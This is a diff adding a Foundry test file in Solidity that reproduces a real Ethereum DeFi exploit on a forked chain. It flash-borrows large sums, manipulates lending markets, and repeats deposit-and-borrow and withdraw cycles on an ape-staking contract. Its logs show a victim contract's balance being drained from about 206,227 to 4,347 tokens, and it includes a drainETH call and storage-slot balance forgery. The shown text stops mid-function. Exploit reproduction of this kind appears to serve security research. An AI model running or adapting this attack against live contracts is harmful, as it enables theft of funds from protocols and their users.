@@ -1,0 +1,2319 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+
+import "forge-std/Test.sol";
+
+interface IERC20 {
+    function balanceOf(address) external view returns (uint256);
+}
+
+// https://explorer.phalcon.xyz/tx/eth/0xe855cc3bad87933bf742fd474bd0ae0ec58d45e9c1a0643b9700dafe8faf0864
+// https://etherscan.io/address/0x8f7370D5d461559f24b83ba675b4C7e2Fdb514cC
+
+struct S2 {
+    address p1;
+    uint256 p2;
+    uint256 p3;
+}
+
+struct S1 {
+    uint256[] p1;
+    uint256[] p2;
+}
+
+struct S3 {
+    uint32 p1;
+    uint224 p2;
+}
+
+struct S4 {
+    uint32 p1;
+    uint32 p2;
+    uint184 p3;
+}
+
+struct S5 {
+    uint32 p1;
+    uint32 p2;
+    uint184 p3;
+    bool p4;
+}
+
+interface I {
+    function depositAndBorrowApeAndStake(S1 memory, S2 memory, S3[] memory, S4[] memory) external payable;
+    function randomTrade(uint256) external payable;
+    function getAccountLiquidity(address) external payable;
+    function setCollectRate(uint256) external payable;
+    function transfer(address, uint256) external payable;
+    function withdrawApeCoin(address, S3[] memory, S5[] memory) external payable;
+    function enterMarkets(address[] memory) external payable;
+    function getUnderlyingPrice(address) external payable;
+    function setApprovalForAll(address, bool) external payable;
+    function borrow(uint256) external payable;
+    function getTimeRangeBy(uint256, uint256) external payable;
+    function balanceOf(address) external payable returns (uint256);
+    function flash(address, uint256, uint256, bytes memory) external payable;
+    function approve(address, uint256) external payable;
+    function pools(uint256) external payable;
+    function mint(uint256) external payable;
+    function getCash() external payable;
+}
+
+contract Xb618 is Test {
+    address immutable r = address(this);
+    receive() external payable {}
+
+    function setUp() public pure {
+        console2.log("0xe855cc3bad87933bf742fd474bd0ae0ec58d45e9c1a0643b9700dafe8faf0864");
+    }
+
+    address constant x01b7 = 0x01b7234e6b24003e88b4e22d0a8d574432d3dFF6;
+    address constant x0518 = 0x0518b21F49548427EF0c16Ff26Ce8a05295F7454;
+    address constant x0b7d = 0x0b7d8EdA67cE2555abe41d2dF2102D62becf38BD;
+    address constant x0b89 = 0x0B89032E2722b103386aDCcaE18B2F5D4986aFa0;
+    address constant x37b6 = 0x37B614714e96227D81fFffBdbDc4489e46eAce8C;
+    address constant x3b2d = 0x3B2da9304bd1308Dc0d1b2F9c3C14F4CF016a955;
+    address constant x4d22 = 0x4d224452801ACEd8B2F0aebE155379bb5D594381;
+    address constant x5954 = 0x5954aB967Bc958940b7EB73ee84797Dc8a2AFbb9;
+    address constant x5f0a = 0x5f0A4a59C8B39CDdBCf0C683a6374655b4f5D76e;
+    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
+    address constant x6a55 = 0x6A55080D5bA7cFf935Fb6aC54f4af4486EE24B1C;
+    address constant x7362 = 0x73625745eD66F0d4C68C91613086ECe1Fc5a0119;
+    address constant x9c1c = 0x9C1c49B595D5c25F0Ccc465099E6D9d0a1E5aB37;
+    address constant xac4b = 0xAc4b3DacB91461209Ae9d41EC517c2B9Cb1B7DAF;
+    address constant xbc4c = 0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D;
+
+    address xe46a;
+    address xbd02;
+    address xeb52;
+
+    uint256 t_uniswapV3FlashCallback = 0;
+    uint256 t_x4ee72226 = 0;
+
+    function test1() public {
+        vm.createSelectFork("http://localhost:18545", 17496631); // tx.blockNumber - 1
+        // vm.createSelectFork("http://localhost:18545", bytes32(0x8aff78099114b0791f028b2869a79d2f54be8b9c80d067fd1a391211083d0430));
+
+        // https://explorer.phalcon.xyz/tx/eth/0x8aff78099114b0791f028b2869a79d2f54be8b9c80d067fd1a391211083d0430
+        this.x8aff7809();
+        // https://explorer.phalcon.xyz/tx/eth/0x8d3036371ccf27579d3cb3d4b4b71e99334cae8d7e8088247517ec640c7a59a5
+        this.x8d303637();
+        // https://explorer.phalcon.xyz/tx/eth/0x45007691748b5fdcbd0baea847d39216117552827694e8623bbe282f373125c7
+        this.x45007691();
+        // https://explorer.phalcon.xyz/tx/eth/0x94fbebf08af9e354cd9336e920165bff8b6086b709f4f8cdb4a56ddfd0705602
+        this.x94fbebf0();
+        // https://explorer.phalcon.xyz/tx/eth/0xe855cc3bad87933bf742fd474bd0ae0ec58d45e9c1a0643b9700dafe8faf0864
+        x4ee72226();
+    }
+
+    function test2() public {
+        vm.createSelectFork("http://localhost:18545", 17496593); // tx.blockNumber - 1
+        // https://explorer.phalcon.xyz/tx/eth/0x8aff78099114b0791f028b2869a79d2f54be8b9c80d067fd1a391211083d0430
+        this.x8aff7809();
+        vm.warp(1686969707);
+        vm.roll(17496619);
+        // https://explorer.phalcon.xyz/tx/eth/0x8d3036371ccf27579d3cb3d4b4b71e99334cae8d7e8088247517ec640c7a59a5
+        this.x8d303637();
+        vm.warp(1686969743);
+        vm.roll(17496622);
+        // https://explorer.phalcon.xyz/tx/eth/0x45007691748b5fdcbd0baea847d39216117552827694e8623bbe282f373125c7
+        this.x45007691();
+        vm.warp(1686969767);
+        vm.roll(17496624);
+        // https://explorer.phalcon.xyz/tx/eth/0x94fbebf08af9e354cd9336e920165bff8b6086b709f4f8cdb4a56ddfd0705602
+        this.x94fbebf0();
+        vm.warp(1686969851);
+        vm.roll(17496631);
+        // https://explorer.phalcon.xyz/tx/eth/0xe855cc3bad87933bf742fd474bd0ae0ec58d45e9c1a0643b9700dafe8faf0864
+        x4ee72226();
+    }
+
+    function test3() public {
+        vm.createSelectFork("http://localhost:18545", 17496631); // tx.blockNumber - 1
+
+        address RECEIVER = address(this);
+        vm.warp(1686969851);
+        vm.roll(17496632);
+        // https://explorer.phalcon.xyz/tx/eth/0xe855cc3bad87933bf742fd474bd0ae0ec58d45e9c1a0643b9700dafe8faf0864
+        vm.deal(RECEIVER, 10 ether);
+        vm.store(
+            address(0x4d224452801ACEd8B2F0aebE155379bb5D594381),
+            keccak256(abi.encode(RECEIVER, uint256(0))),
+            bytes32(uint256(1000000000000000000000000))
+        );
+        vm.store(
+            address(0x5f0A4a59C8B39CDdBCf0C683a6374655b4f5D76e),
+            keccak256(abi.encode(RECEIVER, uint256(51))),
+            bytes32(uint256(1000000000000000000000000))
+        );
+        {
+            address token = address(0x73625745eD66F0d4C68C91613086ECe1Fc5a0119);
+            uint256 target = 1000000000000000000000000;
+            uint256 snap = vm.snapshotState();
+            bool found = false;
+            uint256 foundSlot = type(uint256).max;
+            for (uint256 slot = 0; slot < 100; slot++) {
+                vm.revertToState(snap);
+                vm.store(token, keccak256(abi.encode(RECEIVER, uint256(slot))), bytes32(uint256(target)));
+                uint256 bal = IERC20(token).balanceOf(RECEIVER);
+                if (bal != target) continue;
+                found = true;
+                foundSlot = slot;
+                break;
+            }
+            if (!found) {
+                vm.revertToState(snap);
+            } else {
+                emit log_named_address("GF_SLOT_CACHE_TOKEN", token);
+                emit log_named_uint("GF_SLOT_CACHE_SLOT", foundSlot);
+                emit log_named_uint("GF_SLOT_CACHE_IS_VYPER", 0);
+                vm.revertToState(snap);
+                vm.store(token, keccak256(abi.encode(RECEIVER, uint256(foundSlot))), bytes32(uint256(target)));
+                require(IERC20(token).balanceOf(RECEIVER) == target, "GF: final store failed");
+            }
+        }
+        x4ee72226();
+    }
+
+    function x8aff7809() public {
+        _constructor_();
+    }
+
+    function x4ee72226() public {
+        t_x4ee72226++;
+
+        if (t_x4ee72226 == 1) {
+            bytes memory b14 = abi.encode(130000000000000000000000, 8);
+            I(xac4b).flash(r, 130000000000000000000000, 0, b14);
+
+            return;
+        }
+        if (t_x4ee72226 == 2) {
+            bytes memory b21 = abi.encode(220000000000000000000000, 96);
+            I(xac4b).flash(r, 220000000000000000000000, 0, b21);
+
+            return;
+        }
+    }
+
+    function x8d303637() public {
+        r.call(abi.encodeWithSelector(0x4183411e, 200000000000000000000000));
+    }
+
+    function x45007691() public {
+        Xb618(payable(r)).drainETH(tx.origin);
+    }
+
+    function x94fbebf0() public {
+        r.call(abi.encodeWithSelector(0x4ee72226, 130000000000000000000000, 8));
+    }
+
+    function x4183411e() public {
+        bytes memory b01 = abi.encode(200000000000000000000000, 15);
+        I(xac4b).flash(r, 200000000000000000000000, 0, b01);
+    }
+
+    function onERC721Received(address, address, uint256, bytes memory) public {
+        bytes memory rt = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
+        assembly {
+            return(add(rt, 0x20), mload(rt))
+        }
+    }
+
+    function uniswapV3FlashCallback(uint256, uint256, bytes memory) public {
+        t_uniswapV3FlashCallback++;
+
+        if (t_uniswapV3FlashCallback == 1) {
+            I(x4d22).approve(x7362, 200000000000000000000000);
+            I(x7362).mint(200000000000000000000000);
+            // uint256 v1 = 977135886411374;
+            uint256 v1 = I(x7362).balanceOf(r);
+            console2.log("I(x7362).balanceOf(r)\t\t->", uint256(977135886411374));
+            I(x7362).approve(x3b2d, v1);
+            I(x3b2d).mint(v1);
+
+            address[] memory arr01 = new address[](1);
+            arr01[0] = x3b2d;
+            I(x0518).enterMarkets(arr01);
+
+            I(x9c1c).borrow(1005000000000000000000);
+            I(x5f0a).approve(x5f0a, 1005000000000000000000);
+            I(x5f0a).randomTrade(1);
+            I(x7362).getCash();
+            xbd02 = address(new Xbd02());
+            I(xbc4c).setApprovalForAll(x0b89, true);
+            I(x0b89).setCollectRate(1000000000000000000);
+
+            uint256[] memory arr11 = new uint256[](1);
+            arr11[0] = 9829;
+            uint256[] memory arr12 = new uint256[](0);
+            S1 memory s103 = S1(arr11, arr12);
+            S2 memory s203 = S2(xbc4c, 0, 0);
+            S3[] memory arr13 = new S3[](0);
+            S4[] memory arr14 = new S4[](0);
+            I(x0b89).depositAndBorrowApeAndStake(s103, s203, arr13, arr14);
+
+            I(x0518).getAccountLiquidity(r);
+            I(x37b6).getCash();
+            I(x01b7).getUnderlyingPrice(x37b6);
+            I(x37b6).borrow(102306731023453679484);
+            I(x5954).pools(1);
+            I(x5954).getTimeRangeBy(1, 2);
+            // uint256 v2 = 206227682165404022135955;
+            uint256 v2 = I(x4d22).balanceOf(x5f0a);
+            console2.log("I(x4d22).balanceOf(x5f0a)\t->", "206227682165404022135955 (206227.6821 ether)");
+
+            uint256[] memory arr21 = new uint256[](0);
+            uint256[] memory arr22 = new uint256[](0);
+            S1 memory s105 = S1(arr21, arr22);
+            S2 memory s205 = S2(xbc4c, 0, 0);
+            S3 memory s301 = S3(9829, 10094000000000000000000);
+            S3[] memory arr23 = new S3[](1);
+            arr23[0] = s301;
+            S4[] memory arr24 = new S4[](0);
+            I(x0b89).depositAndBorrowApeAndStake(s105, s205, arr23, arr24);
+
+            S3 memory s306 = S3(9829, 10094000000000000000000);
+            S3[] memory arr32 = new S3[](1);
+            arr32[0] = s306;
+            S5[] memory arr33 = new S5[](0);
+            I(x0b89).withdrawApeCoin(xbc4c, arr32, arr33);
+
+            I(x5954).pools(1);
+            I(x5954).getTimeRangeBy(1, 2);
+            // uint256 v3 = 196133682165404022135955;
+            uint256 v3 = I(x4d22).balanceOf(x5f0a);
+            console2.log("I(x4d22).balanceOf(x5f0a)\t->", "196133682165404022135955 (196133.6821 ether)");
+
+            uint256[] memory arr39 = new uint256[](0);
+            uint256[] memory arr40 = new uint256[](0);
+            S1 memory s107 = S1(arr39, arr40);
+            S2 memory s207 = S2(xbc4c, 0, 0);
+            S3 memory s311 = S3(9829, 10094000000000000000000);
+            S3[] memory arr41 = new S3[](1);
+            arr41[0] = s311;
+            S4[] memory arr42 = new S4[](0);
+            I(x0b89).depositAndBorrowApeAndStake(s107, s207, arr41, arr42);
+
+            S3 memory s316 = S3(9829, 10094000000000000000000);
+            S3[] memory arr50 = new S3[](1);
+            arr50[0] = s316;
+            S5[] memory arr51 = new S5[](0);
+            I(x0b89).withdrawApeCoin(xbc4c, arr50, arr51);
+
+            I(x5954).pools(1);
+            I(x5954).getTimeRangeBy(1, 2);
+            {
+                // uint256 v4 = 186039682165404022135955;
+                uint256 v4 = I(x4d22).balanceOf(x5f0a);
+                console2.log("I(x4d22).balanceOf(x5f0a)\t->", "186039682165404022135955 (186039.6821 ether)");
+
+                uint256[] memory arr57 = new uint256[](0);
+                uint256[] memory arr58 = new uint256[](0);
+                S1 memory s109 = S1(arr57, arr58);
+                S2 memory s209 = S2(xbc4c, 0, 0);
+                S3 memory s321 = S3(9829, 10094000000000000000000);
+                S3[] memory arr59 = new S3[](1);
+                arr59[0] = s321;
+                S4[] memory arr60 = new S4[](0);
+                I(x0b89).depositAndBorrowApeAndStake(s109, s209, arr59, arr60);
+
+                S3 memory s326 = S3(9829, 10094000000000000000000);
+                S3[] memory arr68 = new S3[](1);
+                arr68[0] = s326;
+                S5[] memory arr69 = new S5[](0);
+                I(x0b89).withdrawApeCoin(xbc4c, arr68, arr69);
+
+                I(x5954).pools(1);
+                I(x5954).getTimeRangeBy(1, 2);
+                // uint256 v5 = 175945682165404022135955;
+                uint256 v5 = I(x4d22).balanceOf(x5f0a);
+                console2.log("I(x4d22).balanceOf(x5f0a)\t->", "175945682165404022135955 (175945.6821 ether)");
+
+                uint256[] memory arr75 = new uint256[](0);
+                uint256[] memory arr76 = new uint256[](0);
+                S1 memory s111 = S1(arr75, arr76);
+                S2 memory s211 = S2(xbc4c, 0, 0);
+                S3 memory s331 = S3(9829, 10094000000000000000000);
+                S3[] memory arr77 = new S3[](1);
+                arr77[0] = s331;
+                S4[] memory arr78 = new S4[](0);
+                I(x0b89).depositAndBorrowApeAndStake(s111, s211, arr77, arr78);
+
+                S3 memory s336 = S3(9829, 10094000000000000000000);
+                S3[] memory arr86 = new S3[](1);
+                arr86[0] = s336;
+                S5[] memory arr87 = new S5[](0);
+                I(x0b89).withdrawApeCoin(xbc4c, arr86, arr87);
+
+                I(x5954).pools(1);
+                I(x5954).getTimeRangeBy(1, 2);
+                // uint256 v6 = 165851682165404022135955;
+                uint256 v6 = I(x4d22).balanceOf(x5f0a);
+                console2.log("I(x4d22).balanceOf(x5f0a)\t->", "165851682165404022135955 (165851.6821 ether)");
+
+                uint256[] memory arr93 = new uint256[](0);
+                uint256[] memory arr94 = new uint256[](0);
+                S1 memory s113 = S1(arr93, arr94);
+                S2 memory s213 = S2(xbc4c, 0, 0);
+                S3 memory s341 = S3(9829, 10094000000000000000000);
+                S3[] memory arr95 = new S3[](1);
+                arr95[0] = s341;
+                S4[] memory arr96 = new S4[](0);
+                I(x0b89).depositAndBorrowApeAndStake(s113, s213, arr95, arr96);
+
+                S3 memory s346 = S3(9829, 10094000000000000000000);
+                S3[] memory arr104 = new S3[](1);
+                arr104[0] = s346;
+                S5[] memory arr105 = new S5[](0);
+                I(x0b89).withdrawApeCoin(xbc4c, arr104, arr105);
+
+                I(x5954).pools(1);
+                I(x5954).getTimeRangeBy(1, 2);
+                // uint256 v7 = 155757682165404022135955;
+                uint256 v7 = I(x4d22).balanceOf(x5f0a);
+                console2.log("I(x4d22).balanceOf(x5f0a)\t->", "155757682165404022135955 (155757.6821 ether)");
+
+                uint256[] memory arr111 = new uint256[](0);
+                uint256[] memory arr112 = new uint256[](0);
+                S1 memory s115 = S1(arr111, arr112);
+                S2 memory s215 = S2(xbc4c, 0, 0);
+                S3 memory s351 = S3(9829, 10094000000000000000000);
+                S3[] memory arr113 = new S3[](1);
+                arr113[0] = s351;
+                S4[] memory arr114 = new S4[](0);
+                I(x0b89).depositAndBorrowApeAndStake(s115, s215, arr113, arr114);
+
+                S3 memory s356 = S3(9829, 10094000000000000000000);
+                S3[] memory arr122 = new S3[](1);
+                arr122[0] = s356;
+                S5[] memory arr123 = new S5[](0);
+                I(x0b89).withdrawApeCoin(xbc4c, arr122, arr123);
+
+                I(x5954).pools(1);
+                I(x5954).getTimeRangeBy(1, 2);
+                // uint256 v8 = 145663682165404022135955;
+                uint256 v8 = I(x4d22).balanceOf(x5f0a);
+                console2.log("I(x4d22).balanceOf(x5f0a)\t->", "145663682165404022135955 (145663.6821 ether)");
+
+                uint256[] memory arr129 = new uint256[](0);
+                uint256[] memory arr130 = new uint256[](0);
+                S1 memory s117 = S1(arr129, arr130);
+                S2 memory s217 = S2(xbc4c, 0, 0);
+                S3 memory s361 = S3(9829, 10094000000000000000000);
+                S3[] memory arr131 = new S3[](1);
+                arr131[0] = s361;
+                S4[] memory arr132 = new S4[](0);
+                I(x0b89).depositAndBorrowApeAndStake(s117, s217, arr131, arr132);
+
+                S3 memory s366 = S3(9829, 10094000000000000000000);
+                S3[] memory arr140 = new S3[](1);
+                arr140[0] = s366;
+                S5[] memory arr141 = new S5[](0);
+                I(x0b89).withdrawApeCoin(xbc4c, arr140, arr141);
+
+                I(x5954).pools(1);
+                I(x5954).getTimeRangeBy(1, 2);
+                // uint256 v9 = 135569682165404022135955;
+                uint256 v9 = I(x4d22).balanceOf(x5f0a);
+                console2.log("I(x4d22).balanceOf(x5f0a)\t->", "135569682165404022135955 (135569.6821 ether)");
+
+                uint256[] memory arr147 = new uint256[](0);
+                uint256[] memory arr148 = new uint256[](0);
+                S1 memory s119 = S1(arr147, arr148);
+                S2 memory s219 = S2(xbc4c, 0, 0);
+                S3 memory s371 = S3(9829, 10094000000000000000000);
+                S3[] memory arr149 = new S3[](1);
+                arr149[0] = s371;
+                S4[] memory arr150 = new S4[](0);
+                I(x0b89).depositAndBorrowApeAndStake(s119, s219, arr149, arr150);
+
+                S3 memory s376 = S3(9829, 10094000000000000000000);
+                S3[] memory arr158 = new S3[](1);
+                arr158[0] = s376;
+                S5[] memory arr159 = new S5[](0);
+                I(x0b89).withdrawApeCoin(xbc4c, arr158, arr159);
+
+                I(x5954).pools(1);
+                I(x5954).getTimeRangeBy(1, 2);
+            }
+            {
+                // uint256 v10 = 125475682165404022135955;
+                uint256 v10 = I(x4d22).balanceOf(x5f0a);
+                console2.log("I(x4d22).balanceOf(x5f0a)\t->", "125475682165404022135955 (125475.6821 ether)");
+
+                uint256[] memory arr165 = new uint256[](0);
+                uint256[] memory arr166 = new uint256[](0);
+                S1 memory s121 = S1(arr165, arr166);
+                S2 memory s221 = S2(xbc4c, 0, 0);
+                S3 memory s381 = S3(9829, 10094000000000000000000);
+                S3[] memory arr167 = new S3[](1);
+                arr167[0] = s381;
+                S4[] memory arr168 = new S4[](0);
+                I(x0b89).depositAndBorrowApeAndStake(s121, s221, arr167, arr168);
+
+                S3 memory s386 = S3(9829, 10094000000000000000000);
+                S3[] memory arr176 = new S3[](1);
+                arr176[0] = s386;
+                S5[] memory arr177 = new S5[](0);
+                I(x0b89).withdrawApeCoin(xbc4c, arr176, arr177);
+
+                I(x5954).pools(1);
+                I(x5954).getTimeRangeBy(1, 2);
+                // uint256 v11 = 115381682165404022135955;
+                uint256 v11 = I(x4d22).balanceOf(x5f0a);
+                console2.log("I(x4d22).balanceOf(x5f0a)\t->", "115381682165404022135955 (115381.6821 ether)");
+
+                uint256[] memory arr183 = new uint256[](0);
+                uint256[] memory arr184 = new uint256[](0);
+                S1 memory s123 = S1(arr183, arr184);
+                S2 memory s223 = S2(xbc4c, 0, 0);
+                S3 memory s391 = S3(9829, 10094000000000000000000);
+                S3[] memory arr185 = new S3[](1);
+                arr185[0] = s391;
+                S4[] memory arr186 = new S4[](0);
+                I(x0b89).depositAndBorrowApeAndStake(s123, s223, arr185, arr186);
+
+                S3 memory s396 = S3(9829, 10094000000000000000000);
+                S3[] memory arr194 = new S3[](1);
+                arr194[0] = s396;
+                S5[] memory arr195 = new S5[](0);
+                I(x0b89).withdrawApeCoin(xbc4c, arr194, arr195);
+
+                I(x5954).pools(1);
+                I(x5954).getTimeRangeBy(1, 2);
+                // uint256 v12 = 105287682165404022135955;
+                uint256 v12 = I(x4d22).balanceOf(x5f0a);
+                console2.log("I(x4d22).balanceOf(x5f0a)\t->", "105287682165404022135955 (105287.6821 ether)");
+
+                uint256[] memory arr201 = new uint256[](0);
+                uint256[] memory arr202 = new uint256[](0);
+                S1 memory s125 = S1(arr201, arr202);
+                S2 memory s225 = S2(xbc4c, 0, 0);
+                S3 memory s3101 = S3(9829, 10094000000000000000000);
+                S3[] memory arr203 = new S3[](1);
+                arr203[0] = s3101;
+                S4[] memory arr204 = new S4[](0);
+                I(x0b89).depositAndBorrowApeAndStake(s125, s225, arr203, arr204);
+
+                S3 memory s3106 = S3(9829, 10094000000000000000000);
+                S3[] memory arr212 = new S3[](1);
+                arr212[0] = s3106;
+                S5[] memory arr213 = new S5[](0);
+                I(x0b89).withdrawApeCoin(xbc4c, arr212, arr213);
+
+                I(x5954).pools(1);
+                I(x5954).getTimeRangeBy(1, 2);
+                // uint256 v13 = 95193682165404022135955;
+                uint256 v13 = I(x4d22).balanceOf(x5f0a);
+                console2.log("I(x4d22).balanceOf(x5f0a)\t->", "95193682165404022135955 (95193.6821 ether)");
+
+                uint256[] memory arr219 = new uint256[](0);
+                uint256[] memory arr220 = new uint256[](0);
+                S1 memory s127 = S1(arr219, arr220);
+                S2 memory s227 = S2(xbc4c, 0, 0);
+                S3 memory s3111 = S3(9829, 10094000000000000000000);
+                S3[] memory arr221 = new S3[](1);
+                arr221[0] = s3111;
+                S4[] memory arr222 = new S4[](0);
+                I(x0b89).depositAndBorrowApeAndStake(s127, s227, arr221, arr222);
+
+                S3 memory s3116 = S3(9829, 10094000000000000000000);
+                S3[] memory arr230 = new S3[](1);
+                arr230[0] = s3116;
+                S5[] memory arr231 = new S5[](0);
+                I(x0b89).withdrawApeCoin(xbc4c, arr230, arr231);
+
+                I(x5954).pools(1);
+                I(x5954).getTimeRangeBy(1, 2);
+                // uint256 v14 = 85099682165404022135955;
+                uint256 v14 = I(x4d22).balanceOf(x5f0a);
+                console2.log("I(x4d22).balanceOf(x5f0a)\t->", "85099682165404022135955 (85099.6821 ether)");
+
+                uint256[] memory arr237 = new uint256[](0);
+                uint256[] memory arr238 = new uint256[](0);
+                S1 memory s129 = S1(arr237, arr238);
+                S2 memory s229 = S2(xbc4c, 0, 0);
+                S3 memory s3121 = S3(9829, 10094000000000000000000);
+                S3[] memory arr239 = new S3[](1);
+                arr239[0] = s3121;
+                S4[] memory arr240 = new S4[](0);
+                I(x0b89).depositAndBorrowApeAndStake(s129, s229, arr239, arr240);
+
+                S3 memory s3126 = S3(9829, 10094000000000000000000);
+                S3[] memory arr248 = new S3[](1);
+                arr248[0] = s3126;
+                S5[] memory arr249 = new S5[](0);
+                I(x0b89).withdrawApeCoin(xbc4c, arr248, arr249);
+
+                I(x5954).pools(1);
+                I(x5954).getTimeRangeBy(1, 2);
+                // uint256 v15 = 75005682165404022135955;
+                uint256 v15 = I(x4d22).balanceOf(x5f0a);
+                console2.log("I(x4d22).balanceOf(x5f0a)\t->", "75005682165404022135955 (75005.6821 ether)");
+
+                uint256[] memory arr255 = new uint256[](0);
+                uint256[] memory arr256 = new uint256[](0);
+                S1 memory s131 = S1(arr255, arr256);
+                S2 memory s231 = S2(xbc4c, 0, 0);
+                S3 memory s3131 = S3(9829, 10094000000000000000000);
+                S3[] memory arr257 = new S3[](1);
+                arr257[0] = s3131;
+                S4[] memory arr258 = new S4[](0);
+                I(x0b89).depositAndBorrowApeAndStake(s131, s231, arr257, arr258);
+
+                S3 memory s3136 = S3(9829, 10094000000000000000000);
+                S3[] memory arr266 = new S3[](1);
+                arr266[0] = s3136;
+                S5[] memory arr267 = new S5[](0);
+                I(x0b89).withdrawApeCoin(xbc4c, arr266, arr267);
+
+                I(x5954).pools(1);
+                I(x5954).getTimeRangeBy(1, 2);
+            }
+            {
+                // uint256 v16 = 64911682165404022135955;
+                uint256 v16 = I(x4d22).balanceOf(x5f0a);
+                console2.log("I(x4d22).balanceOf(x5f0a)\t->", "64911682165404022135955 (64911.6821 ether)");
+
+                uint256[] memory arr273 = new uint256[](0);
+                uint256[] memory arr274 = new uint256[](0);
+                S1 memory s133 = S1(arr273, arr274);
+                S2 memory s233 = S2(xbc4c, 0, 0);
+                S3 memory s3141 = S3(9829, 10094000000000000000000);
+                S3[] memory arr275 = new S3[](1);
+                arr275[0] = s3141;
+                S4[] memory arr276 = new S4[](0);
+                I(x0b89).depositAndBorrowApeAndStake(s133, s233, arr275, arr276);
+
+                S3 memory s3146 = S3(9829, 10094000000000000000000);
+                S3[] memory arr284 = new S3[](1);
+                arr284[0] = s3146;
+                S5[] memory arr285 = new S5[](0);
+                I(x0b89).withdrawApeCoin(xbc4c, arr284, arr285);
+
+                I(x5954).pools(1);
+                I(x5954).getTimeRangeBy(1, 2);
+                // uint256 v17 = 54817682165404022135955;
+                uint256 v17 = I(x4d22).balanceOf(x5f0a);
+                console2.log("I(x4d22).balanceOf(x5f0a)\t->", "54817682165404022135955 (54817.6821 ether)");
+
+                uint256[] memory arr291 = new uint256[](0);
+                uint256[] memory arr292 = new uint256[](0);
+                S1 memory s135 = S1(arr291, arr292);
+                S2 memory s235 = S2(xbc4c, 0, 0);
+                S3 memory s3151 = S3(9829, 10094000000000000000000);
+                S3[] memory arr293 = new S3[](1);
+                arr293[0] = s3151;
+                S4[] memory arr294 = new S4[](0);
+                I(x0b89).depositAndBorrowApeAndStake(s135, s235, arr293, arr294);
+
+                S3 memory s3156 = S3(9829, 10094000000000000000000);
+                S3[] memory arr302 = new S3[](1);
+                arr302[0] = s3156;
+                S5[] memory arr303 = new S5[](0);
+                I(x0b89).withdrawApeCoin(xbc4c, arr302, arr303);
+
+                I(x5954).pools(1);
+                I(x5954).getTimeRangeBy(1, 2);
+                // uint256 v18 = 44723682165404022135955;
+                uint256 v18 = I(x4d22).balanceOf(x5f0a);
+                console2.log("I(x4d22).balanceOf(x5f0a)\t->", "44723682165404022135955 (44723.6821 ether)");
+
+                uint256[] memory arr309 = new uint256[](0);
+                uint256[] memory arr310 = new uint256[](0);
+                S1 memory s137 = S1(arr309, arr310);
+                S2 memory s237 = S2(xbc4c, 0, 0);
+                S3 memory s3161 = S3(9829, 10094000000000000000000);
+                S3[] memory arr311 = new S3[](1);
+                arr311[0] = s3161;
+                S4[] memory arr312 = new S4[](0);
+                I(x0b89).depositAndBorrowApeAndStake(s137, s237, arr311, arr312);
+
+                S3 memory s3166 = S3(9829, 10094000000000000000000);
+                S3[] memory arr320 = new S3[](1);
+                arr320[0] = s3166;
+                S5[] memory arr321 = new S5[](0);
+                I(x0b89).withdrawApeCoin(xbc4c, arr320, arr321);
+
+                I(x5954).pools(1);
+                I(x5954).getTimeRangeBy(1, 2);
+                // uint256 v19 = 34629682165404022135955;
+                uint256 v19 = I(x4d22).balanceOf(x5f0a);
+                console2.log("I(x4d22).balanceOf(x5f0a)\t->", "34629682165404022135955 (34629.6821 ether)");
+
+                uint256[] memory arr327 = new uint256[](0);
+                uint256[] memory arr328 = new uint256[](0);
+                S1 memory s139 = S1(arr327, arr328);
+                S2 memory s239 = S2(xbc4c, 0, 0);
+                S3 memory s3171 = S3(9829, 10094000000000000000000);
+                S3[] memory arr329 = new S3[](1);
+                arr329[0] = s3171;
+                S4[] memory arr330 = new S4[](0);
+                I(x0b89).depositAndBorrowApeAndStake(s139, s239, arr329, arr330);
+
+                S3 memory s3176 = S3(9829, 10094000000000000000000);
+                S3[] memory arr338 = new S3[](1);
+                arr338[0] = s3176;
+                S5[] memory arr339 = new S5[](0);
+                I(x0b89).withdrawApeCoin(xbc4c, arr338, arr339);
+
+                I(x5954).pools(1);
+                I(x5954).getTimeRangeBy(1, 2);
+                // uint256 v20 = 24535682165404022135955;
+                uint256 v20 = I(x4d22).balanceOf(x5f0a);
+                console2.log("I(x4d22).balanceOf(x5f0a)\t->", "24535682165404022135955 (24535.6821 ether)");
+
+                uint256[] memory arr345 = new uint256[](0);
+                uint256[] memory arr346 = new uint256[](0);
+                S1 memory s141 = S1(arr345, arr346);
+                S2 memory s241 = S2(xbc4c, 0, 0);
+                S3 memory s3181 = S3(9829, 10094000000000000000000);
+                S3[] memory arr347 = new S3[](1);
+                arr347[0] = s3181;
+                S4[] memory arr348 = new S4[](0);
+                I(x0b89).depositAndBorrowApeAndStake(s141, s241, arr347, arr348);
+
+                S3 memory s3186 = S3(9829, 10094000000000000000000);
+                S3[] memory arr356 = new S3[](1);
+                arr356[0] = s3186;
+                S5[] memory arr357 = new S5[](0);
+                I(x0b89).withdrawApeCoin(xbc4c, arr356, arr357);
+
+                I(x5954).pools(1);
+                I(x5954).getTimeRangeBy(1, 2);
+                // uint256 v21 = 14441682165404022135955;
+                uint256 v21 = I(x4d22).balanceOf(x5f0a);
+                console2.log("I(x4d22).balanceOf(x5f0a)\t->", "14441682165404022135955 (14441.6821 ether)");
+
+                uint256[] memory arr363 = new uint256[](0);
+                uint256[] memory arr364 = new uint256[](0);
+                S1 memory s143 = S1(arr363, arr364);
+                S2 memory s243 = S2(xbc4c, 0, 0);
+                S3 memory s3191 = S3(9829, 10094000000000000000000);
+                S3[] memory arr365 = new S3[](1);
+                arr365[0] = s3191;
+                S4[] memory arr366 = new S4[](0);
+                I(x0b89).depositAndBorrowApeAndStake(s143, s243, arr365, arr366);
+
+                S3 memory s3196 = S3(9829, 10094000000000000000000);
+                S3[] memory arr374 = new S3[](1);
+                arr374[0] = s3196;
+                S5[] memory arr375 = new S5[](0);
+                I(x0b89).withdrawApeCoin(xbc4c, arr374, arr375);
+
+                I(x5954).pools(1);
+                I(x5954).getTimeRangeBy(1, 2);
+            }
+            {
+                // uint256 v22 = 4347682165404022135955;
+                uint256 v22 = I(x4d22).balanceOf(x5f0a);
+                console2.log("I(x4d22).balanceOf(x5f0a)\t->", "4347682165404022135955 (4347.6821 ether)");
+
+                uint256[] memory arr381 = new uint256[](0);
+                uint256[] memory arr382 = new uint256[](0);
+                S1 memory s145 = S1(arr381, arr382);
+                S2 memory s245 = S2(xbc4c, 0, 0);
+                S3 memory s3201 = S3(9829, 4347682165404022135955);
+                S3[] memory arr383 = new S3[](1);
+                arr383[0] = s3201;
